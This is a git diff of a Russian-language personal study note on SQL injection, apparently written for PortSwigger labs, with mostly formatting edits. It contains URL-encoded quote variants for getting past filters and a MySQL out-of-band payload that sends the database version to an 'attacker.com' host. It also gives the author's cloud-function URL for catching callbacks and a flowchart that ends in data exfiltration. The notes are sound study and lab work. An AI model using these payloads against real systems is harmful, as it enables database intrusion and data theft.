@@ -25,7 +25,7 @@
 
 Пробуем обойти возможные фильтры, не меняя логику:
 ОБФУСКАЦИЯ
-
+```sql
 - `id=5%27` (URL-encoded `'`)
     
 - `id=5%2527` (Double URL-encoded `'`)
@@ -66,7 +66,7 @@
 - **Для MySQL (если есть `load_file` и включена `secure_file_priv`):**  
     `' AND (SELECT load_file(concat('\\\\',(SELECT version()),'.ваш-домен.attacker.com\\test')))--`
     
-
+```
 > Для этого вам нужен свой сервер (например, VPS) и инструмент вроде `Burp Collaborator`(есть в Burp Suite Pro) или `interactsh` для перехвата таких callback-запросов.
 
 
@@ -75,12 +75,12 @@
 
 
 
-борьба в waf
+борьба c waf
 
 <img src="../../assets/deep-20260106-f524af.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
 
 
-
+------
 
 теория porswigger
 1) изменить логику запроса,  например деление на ноль.
@@ -89,10 +89,10 @@
 
 
 
-# СОЗДАЛ ОБЛАЧНУЮ ФУНКЦИЮ КОТОРАЯ 
-# ПРИНИМАЕТ ДАННЫЕ ПО ССЫЛКЕ
-# ДЛЯ  OAST  (OOB)
-[https://functions.yandexcloud.net/d4eehe74dgv6ukpc1q6t](https://functions.yandexcloud.net/d4eehe74dgv6ukpc1q6t)
+#### СОЗДАЛ ОБЛАЧНУЮ ФУНКЦИЮ КОТОРАЯ 
+##### ПРИНИМАЕТ ДАННЫЕ ПО ССЫЛКЕ
+#### ДЛЯ  OAST  (OOB)
+[https://functions.yandexcloud.net/d4eehe74dgv6ukpc1q6t] но как оказалось, бурп лабы не делают от себя запросы на сторонние ресурсы
 
 ### 1. **Для SQL-инъекций** ([[SQLi]])
 
@@ -158,7 +158,7 @@ http://functions.yandexcloud.net/d4eehe74dgv6ukpc1q6t?ssrf=1&token=secret
 
 	план дествий общий!!
 
-
+```c
 A["Начало: Подозрительный параметр"] --> B["Базовый тест:<br>добавляем ' или "]
 
 B --> C{Есть видимая реакция?}
@@ -182,6 +182,7 @@ L --> M["📤 Отправляем payload на свою функцию<br>(xp_d
 M --> N{В логах функции есть запрос?}
 N -- "✅ ДА" --> O["🎉 ПОБЕДА! Уязвимость доказана.<br>Начинаем эксфильтрацию данных"]
 N -- "❌ НЕТ" --> P["📭 Вероятно, уязвимости нет<br>или WAF блокирует исходящие запросы"]
+```
 
 
 <img src="../../assets/deep6b5c99-1.png" alt="Скрин" style="width: 90%; max-width: 3000px;" />
